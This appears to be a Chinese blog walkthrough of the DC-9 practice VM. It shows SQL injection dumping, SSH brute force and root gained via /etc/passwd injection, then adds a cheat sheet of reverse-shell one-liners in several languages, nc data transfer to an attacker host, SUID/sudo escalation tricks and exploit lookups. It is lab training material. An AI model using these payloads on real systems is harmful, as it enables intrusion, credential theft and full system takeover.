<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/var/www/html<span class="comment"># nmap -sV -p- -A 192.168.126.159</span></span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https://nmap.org ) at <span class="number">2020</span><span class="literal">-09</span><span class="literal">-19</span> <span class="number">11</span>:<span class="number">37</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">126.159</span></span><br><span class="line">Host is up (<span class="number">0.00049</span>s latency).</span><br><span class="line">Not shown: <span class="number">65519</span> closed ports</span><br><span class="line">PORT      STATE    SERVICE       VERSION</span><br><span class="line"><span class="number">22</span>/tcp    filtered ssh</span><br><span class="line"><span class="number">80</span>/tcp    open     http          Apache httpd <span class="number">2.4</span>.<span class="number">38</span> ((Debian))</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nc 192.168.126.159 7469</span></span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 7469 (?) : <span class="title">Connection</span></span> refused</span><br><span class="line">root@kali:~<span class="comment"># nc 192.168.126.159 8475</span></span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 8475 (?) : <span class="title">Connection</span></span> refused</span><br><span class="line">root@kali:~<span class="comment"># nc 192.168.126.159 9842</span></span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 9842 (?) : <span class="title">Connection</span></span> refused</span><br><span class="line">root@kali:~<span class="comment"># nmap -p 22 192.168.126.159</span></span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https://nmap.org ) at <span class="number">2020</span><span class="literal">-09</span><span class="literal">-19</span> <span class="number">16</span>:<span class="number">59</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">126.159</span></span><br><span class="line">Host is up (<span class="number">0.00032</span>s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp open  ssh</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:<span class="number">76</span>:F3:B2 (VMware)</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存在本地文件</span></span><br><span class="line">root@kali:~<span class="comment"># sqlmap -r dc-9 -D users -T UserDetails -C password --dump --output-dir /root/</span></span><br><span class="line">root@kali:~/<span class="number">192.168</span>.<span class="number">126.159</span>/dump/users<span class="comment"># hydra -L dc_user.txt -P pass_dc.txt ssh://192.168.126.159</span></span><br><span class="line">[<span class="number">22</span>][<span class="type">ssh</span>] host: <span class="number">192.168</span>.<span class="number">126.159</span>   login: chandlerb   password: UrAG0D!</span><br><span class="line">[<span class="number">22</span>][<span class="type">ssh</span>] host: <span class="number">192.168</span>.<span class="number">126.159</span>   login: joeyt   password: Passw0rd</span><br><span class="line">[<span class="number">22</span>][<span class="type">ssh</span>] host: <span class="number">192.168</span>.<span class="number">126.159</span>   login: janitor   password: Ilovepeepee</span><br></pre></td></tr></table></figure>

<p><strong>分别登陆3个用户，查看有没有什么线索，最后在janitor用户下发现了隐藏文件，里面又是几个密码，加入之前的密码本进行爆破，得到了新用户fredf，密码为B4-Tru3-001。进去查看提权文件，发现test文件可以执行root权限，运行完发现是python编写的，但是打开又是乱码，于是查找test.py文件，果然发现了，查看代码，大概意思就是可以将一个文件写入到另一个文件上，可以利用此添加用户，加入到/etc/passwd中去！</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">janitor@dc<span class="literal">-9</span>:~<span class="variable">$</span> ls <span class="literal">-la</span></span><br><span class="line">total <span class="number">16</span></span><br><span class="line">drwx------  <span class="number">4</span> janitor janitor <span class="number">4096</span> Sep <span class="number">19</span> <span class="number">19</span>:<span class="number">15</span> .</span><br><span class="line">drwxr<span class="literal">-xr</span><span class="literal">-x</span> <span class="number">19</span> root    root    <span class="number">4096</span> Dec <span class="number">29</span>  <span class="number">2019</span> ..</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> janitor janitor    <span class="number">9</span> Dec <span class="number">29</span>  <span class="number">2019</span> .bash_history -&gt; /dev/null</span><br><span class="line">drwx------  <span class="number">3</span> janitor janitor <span class="number">4096</span> Sep <span class="number">19</span> <span class="number">19</span>:<span class="number">15</span> .gnupg</span><br><span class="line">drwx------  <span class="number">2</span> janitor janitor <span class="number">4096</span> Dec <span class="number">29</span>  <span class="number">2019</span> .secrets<span class="literal">-for</span><span class="literal">-putin</span></span><br><span class="line">janitor@dc<span class="literal">-9</span>:~<span class="variable">$</span> cd .secrets<span class="literal">-for</span><span class="literal">-putin</span>/</span><br><span class="line">janitor@dc<span class="literal">-9</span>:~/.secrets<span class="literal">-for</span><span class="literal">-putin</span><span class="variable">$</span> ls</span><br><span class="line">passwords<span class="literal">-found</span><span class="literal">-on</span><span class="literal">-post</span><span class="literal">-it</span><span class="literal">-notes</span>.txt</span><br><span class="line">janitor@dc<span class="literal">-9</span>:~/.secrets<span class="literal">-for</span><span class="literal">-putin</span><span class="variable">$</span> cat passwords<span class="literal">-found</span><span class="literal">-on</span><span class="literal">-post</span><span class="literal">-it</span><span class="literal">-notes</span>.txt </span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic<span class="comment">#10-4</span></span><br><span class="line">B4<span class="literal">-Tru3</span><span class="literal">-001</span></span><br><span class="line"><span class="number">4</span>uGU5T<span class="literal">-NiGHts</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查找test.py</span></span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> find / <span class="literal">-name</span> test.py <span class="number">2</span>&gt;/dev/null</span><br><span class="line">/opt/devstuff/test.py</span><br><span class="line">/usr/lib/python3/dist<span class="literal">-packages</span>/setuptools/command/test.py</span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> cd /opt/devstuff/</span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff<span class="variable">$</span> ls</span><br><span class="line">build  dist  __pycache__  test.py  test.spec</span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff<span class="variable">$</span> cat test.py </span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">import sys</span><br><span class="line"><span class="keyword">if</span> len (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    print (<span class="string">"Usage: python test.py read append"</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = open(sys.argv[<span class="number">1</span>], <span class="string">"r"</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = open(sys.argv[<span class="number">2</span>], <span class="string">"a"</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>

<p><strong>利用kail自带的openssl，进行加密，-1表示md5算法，-salt表示插入一个随机数作为加密内容</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> openssl passwd <span class="literal">-1</span> <span class="literal">-salt</span> test <span class="number">123456</span></span><br><span class="line"><span class="variable">$1</span><span class="variable">$test</span><span class="variable">$at615QShYKduQlx5z9Zm7</span>/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户名:密码:uid:gid:家目录:登陆后使用的shell</span></span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> echo <span class="string">'test:$1$test$at615QShYKduQlx5z9Zm7/:0:0::/root:/bin/bash'</span> &gt;&gt; /tmp/passwd</span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> sudo ./test /tmp/passwd /etc/passwd</span><br><span class="line">fredf@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="variable">$</span> su test</span><br><span class="line">Password: </span><br><span class="line">root@dc<span class="literal">-9</span>:/opt/devstuff/dist/test<span class="comment"># cd /root</span></span><br><span class="line">  </span><br><span class="line">root@dc<span class="literal">-9</span>:~<span class="comment"># cat theflag.txt </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗</span><br><span class="line">████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║</span><br><span class="line">██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║</span><br><span class="line">██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝</span><br><span class="line">██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗</span><br><span class="line">╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝</span><br><span class="line">                                                                             </span><br><span class="line">Congratulations - you have done well to get to this point.</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC<span class="literal">-9</span>.  Just wanted to send out a big thanks to all those</span><br><span class="line">who have taken the time to complete the various DC challenges.</span><br><span class="line"></span><br><span class="line">I also want to send out a big thank you to the various members of @m0tl3ycr3w .</span><br><span class="line"></span><br><span class="line">They are an inspirational bunch of fellows.</span><br><span class="line"></span><br><span class="line">Sure, they might smell a bit, but...just kidding.  :-)</span><br><span class="line"></span><br><span class="line">Sadly, all things must come to an <span class="keyword">end</span>, and this will be the last ever</span><br><span class="line">challenge <span class="keyword">in</span> the DC series.</span><br><span class="line"></span><br><span class="line">So long, and thanks <span class="keyword">for</span> all the fish.</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a><strong>知识点总结</strong></h2><h3 id="1-nc常见用法"><a href="#1-nc常见用法" class="headerlink" title="1.nc常见用法"></a><strong>1.nc常见用法</strong></h3><p>简单介绍下，nc（netcat）网络工具中的瑞士军刀，主要作用如下：</p>
<ul>
<li><strong>实现任意TCP/UDP端口的侦听，nc可以作为server以TCP或UDP方式侦听指定端口</strong></li>
<li><strong>端口的扫描，nc可以作为client发起TCP或UDP连接</strong></li>
<li><strong>机器之间传输文件</strong></li>
</ul>
<table>
<thead>
<tr>
<th><strong>常用命令</strong></th>
<th align="left"><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>nc  -lvp   2333</strong></td>
<td align="left"><strong>-l   使用监听模式     -v 显示指令执行过程  用-vv将更详细<br>-p   &lt;通信端口&gt;     设置本地主机使用的通信端口</strong></td>
</tr>
<tr>
<td><strong>-z</strong></td>
<td align="left"><strong>使用0输入/输出模式，只在扫描通信端口时使用</strong></td>
</tr>
<tr>
<td><strong>-w&lt;超时秒数&gt;</strong></td>
<td align="left"><strong>设置等待连线的时间</strong></td>
</tr>
<tr>
<td><strong>-n</strong></td>
<td align="left"><strong>直接使用IP地址，而不通过域名服务器</strong></td>
</tr>
<tr>
<td><strong>-e filename</strong></td>
<td align="left"><strong>program to exec after connect [dangerous!!]</strong></td>
</tr>
</tbody></table>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#TCP端口扫描，-w2设置2s超时时间，避免漏过某些端口</span></span><br><span class="line">root@kali:~<span class="comment"># nc -zv -w2  192.168.126.159 1-100</span></span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 80 (<span class="title">http</span></span>) open</span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 22 (<span class="title">ssh</span></span>) open</span><br><span class="line"></span><br><span class="line"><span class="comment">#UDP端口扫描</span></span><br><span class="line">root@kali:~<span class="comment"># nc -zuv -w2  192.168.126.159 1-100</span></span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 752 (<span class="title">passwd</span></span><span class="literal">-server</span>) open</span><br><span class="line">(UNKNOWN) <span class="function">[<span class="number">192.168</span><span class="type">.126.159</span>] 751 (<span class="title">kerberos</span></span><span class="literal">-master</span>) open</span><br><span class="line"></span><br><span class="line"><span class="comment">#常见用法，用来传输文件</span></span><br><span class="line">靶机：ps aux | nc <span class="literal">-nv</span> <span class="number">192.168</span>.<span class="number">126.33</span> <span class="number">2333</span> <span class="literal">-q</span> <span class="number">1</span>  <span class="comment">#-q 1的意思是连接成功时候，连接会自动断掉</span></span><br><span class="line">主机：nc <span class="literal">-lp</span> <span class="number">2333</span> &gt; ps.txt </span><br><span class="line"></span><br><span class="line"><span class="comment">#连接目标ip端口后，执行/bin/bash命令，即反弹shell</span></span><br><span class="line">nc <span class="literal">-e</span> /bin/bash <span class="number">192.168</span>.<span class="number">126.33</span> <span class="number">2333</span></span><br></pre></td></tr></table></figure>

<h3 id="2-常见反弹shell的姿势"><a href="#2-常见反弹shell的姿势" class="headerlink" title="2.常见反弹shell的姿势"></a><strong>2.常见反弹shell的姿势</strong></h3><p>基本上进入靶机后，都要先反弹shell，这样连接更稳定些，也避免端口关闭无法连接，主要的几种方式如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#bash版本：</span></span><br><span class="line">bash <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">10.0</span>.<span class="number">0.1</span>/<span class="number">8080</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#nc版本：</span></span><br><span class="line">nc <span class="literal">-e</span> /bin/sh <span class="number">10.0</span>.<span class="number">0.1</span> <span class="number">1234</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#顺序执行多条命令，可以用分号;mkfifo 创建管道符</span></span><br><span class="line">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh <span class="literal">-i</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">10.0</span>.<span class="number">0.1</span> <span class="number">1234</span> &gt;/tmp/f</span><br><span class="line"></span><br><span class="line"><span class="comment">#远程的输入，作为本地的输入，在本地解释器执行后，再输出到远程，实现反弹shell</span></span><br><span class="line">nc x.x.x.x <span class="number">8888</span>|/bin/sh|nc x.x.x.x <span class="number">9999</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#perl版本:</span></span><br><span class="line">perl <span class="literal">-e</span> <span class="string">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#python版本：</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#php版本：</span></span><br><span class="line">php <span class="literal">-r</span> <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ruby版本：</span></span><br><span class="line">ruby <span class="literal">-rsocket</span> <span class="literal">-e</span><span class="string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#java版本</span></span><br><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \<span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br><span class="line"></span><br><span class="line"><span class="comment">#lua</span></span><br><span class="line">lua <span class="literal">-e</span> <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>

<h3 id="3-提权姿势总结"><a href="#3-提权姿势总结" class="headerlink" title="3.提权姿势总结"></a><strong>3.提权姿势总结</strong></h3><p>一般提权方式可分为，漏洞提取和文件命令执行提取，下面介绍下本次靶机遇到的几种主要的文件命令提权：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#首先查找具有suid权限的文件，此类型文件执行时可以暂时获得root权限</span></span><br><span class="line">find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment">#假设find具有suid权限，可通过-exec执行脚本命令，从而获得root权限</span></span><br><span class="line">find test <span class="literal">-exec</span> <span class="string">'/bin/bash'</span> \;</span><br><span class="line"></span><br><span class="line"><span class="comment">#发现git具有suid权限时，</span></span><br><span class="line">sudo git help config ==》进入交互模式</span><br><span class="line">!/bin/sh ==&gt;反弹shell，从而获得root权限、</span><br><span class="line"></span><br><span class="line"><span class="comment">#发现nmap可以提权时，编写可执行脚本，进行反弹shell</span></span><br><span class="line">echo <span class="string">'os.execute("/bin/sh")'</span> &gt;  chj.nse  <span class="comment">#写入命令</span></span><br><span class="line">sudo nmap -<span class="literal">-script</span>=/home/jens/chj.nse</span><br><span class="line"></span><br><span class="line"><span class="comment">#vi提权，遇到shell受限制时，通过echo $PATH 、echo /home/xx/usr/bin/*查找可执行命令</span></span><br><span class="line">:set shell=/bin/sh	<span class="comment">#vi允许在其中执行脚本和命令，因此可以借此反弹shell提权</span></span><br><span class="line">:shell  </span><br><span class="line"></span><br><span class="line"><span class="comment">#遇到陌生的命令，建议先看下命令说明，找到相关参数，从而实现提权</span></span><br><span class="line">teehee <span class="literal">-h</span></span><br><span class="line">teehee <span class="literal">-a</span> <span class="comment">#可以写入文件内容而不覆盖</span></span><br><span class="line">echo <span class="string">"admin::0:0:::/bin/bash"</span> | sudo teehee <span class="literal">-a</span> /etc/passwd</span><br><span class="line"></span><br><span class="line">echo  <span class="string">"* * * * * root chmod 4777 /bin/sh"</span> | sudo teehee <span class="literal">-a</span> /etc/crontab</span><br><span class="line"><span class="comment">#切换admin用户，即拥有root权限</span></span><br></pre></td></tr></table></figure>

<p>利用漏洞提权：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux内核漏洞利用</span></span><br><span class="line">uname <span class="literal">-a</span> <span class="comment">#查看内核版本</span></span><br><span class="line">root@kali:~<span class="comment"># searchsploit ubuntu 16.04	 #查找相关poc</span></span><br><span class="line">root@kali:~<span class="comment"># cat ubuntu_v1604_shell.txt  #介绍exp使用方法</span></span><br><span class="line">An exploit that puts all this together is <span class="keyword">in</span> exploit.tar. Usage:</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput<span class="variable">$</span> ./compile.sh</span><br><span class="line">user@host:~/ebpf_mapfd_doubleput<span class="variable">$</span> ./doubleput</span><br><span class="line"><span class="comment">#本地搭建web服务，方便靶机下载exp</span></span><br><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer 8000  #搭建http服务，提供文件浏览的web服务</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">8000</span> ...</span><br><span class="line"><span class="variable">$</span> wget http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">8000</span>/exploit.tar <span class="comment">#下载文件</span></span><br><span class="line">tar <span class="literal">-xvf</span> exploit.tar</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">./compile.sh </span><br><span class="line">./doubleput  </span><br><span class="line"></span><br><span class="line"><span class="comment">#本地文件漏洞利用，有时候可能存有一些可利用的文件</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:~/html<span class="variable">$</span> find / <span class="literal">-perm</span> <span class="literal">-u</span>=s <span class="literal">-type</span> f <span class="number">2</span>&gt;/dev/null <span class="comment">#查看sudo权限</span></span><br><span class="line">/bin/screen<span class="literal">-4</span>.<span class="number">5.0</span>  <span class="comment">#发现了一个可能可以利用的文件</span></span><br><span class="line">root@kali:~<span class="comment"># searchsploit screen 4.5.0</span></span><br><span class="line">...  <span class="comment">#exp编写过程有点复杂，需要仔细看使用说明，上传到靶机后若无执行权限，记得添加</span></span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:/tmp<span class="variable">$</span> chmod +x <span class="number">41154</span>.sh</span><br><span class="line">www<span class="literal">-data</span>@dc<span class="literal">-5</span>:/tmp<span class="variable">$</span> ./<span class="number">41154</span>.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#同上</span></span><br><span class="line">root@kali:/var/www/html<span class="comment"># searchsploit exim</span></span><br><span class="line">Exim <span class="number">4.87</span> - <span class="number">4.91</span> - Local Privilege Escalation                                              | exploits/linux/local/<span class="number">46996</span>.sh</span><br></pre></td></tr></table></figure>

<p><strong>总结下此次靶场提权的思路，首先查看具有suid权限的文件是否可利用，如果无可用再查看内核版本是否有漏洞。</strong></p>
<h3 id="4-get-webshell思路"><a href="#4-get-webshell思路" class="headerlink" title="4.get webshell思路"></a><strong>4.get webshell思路</strong></h3><h4 id="4-1-信息收集"><a href="#4-1-信息收集" class="headerlink" title="4.1.信息收集"></a><strong>4.1.信息收集</strong></h4><p><strong>cms指纹识别—whatweb、火狐插件wappalyzer</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#whatweb用来时别cms信息比较快，支持批量导入，导出也可以以各种文件的形式</span></span><br><span class="line">whatweb ip</span><br><span class="line">whatweb <span class="literal">-i</span> /root/url.txt</span><br><span class="line">whatweb <span class="literal">-i</span> xx -<span class="literal">-log</span><span class="literal">-verbose</span>=xx.txt</span><br></pre></td></tr></table></figure>

<p><strong>后台路径爆破–Dirbuster、dirb命令</strong></p>
<p>dirbuster使用方法比较简单，主要是要有一个强大的字典，使用页面如下：</p>
<p><img src="/2020/09/12/DC%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/28.png" alt></p>
<p>dirb的主要使用方式如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dirb  http://<span class="number">192.168</span>.<span class="number">126.33</span>  /usr/share/wordlists/dirb/big.txt <span class="comment">#kail自带字典</span></span><br><span class="line"><span class="comment">#-a 设置user-agent   -c 设置cookie</span></span><br><span class="line"><span class="comment">#User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器</span></span><br><span class="line"><span class="comment">#能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器插件等</span></span><br><span class="line">dirb http://<span class="number">192.168</span>.<span class="number">1.116</span> <span class="literal">-a</span> <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) </span></span><br><span class="line"><span class="string">Gecko/20100101 Firefox/75.0"</span>  <span class="literal">-c</span> <span class="string">"BAIDUID=D5C6351DAC89EF8811A..."</span></span><br><span class="line"></span><br><span class="line">dirb http://<span class="number">192.168</span>.<span class="number">1.116</span>  <span class="literal">-X</span> .dist <span class="literal">-z</span> <span class="number">100</span> <span class="literal">-o</span> test.txt</span><br><span class="line"><span class="comment">#-X 在每个字典的后面添加一个后缀  -z 添加毫秒延迟，避免洪水攻击</span></span><br><span class="line"><span class="comment">#-o 输出结果</span></span><br><span class="line"></span><br><span class="line">dirb http://<span class="number">192.168</span>.<span class="number">1.116</span>  <span class="literal">-p</span> <span class="number">46.17</span>.<span class="number">45.194</span>:<span class="number">5210</span> <span class="comment">#使用代理</span></span><br></pre></td></tr></table></figure>

<p>wpscan：<strong><code>WPScan</code>是一个扫描 <code>WordPress</code> 漏洞的黑盒子扫描器，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞</strong></p>
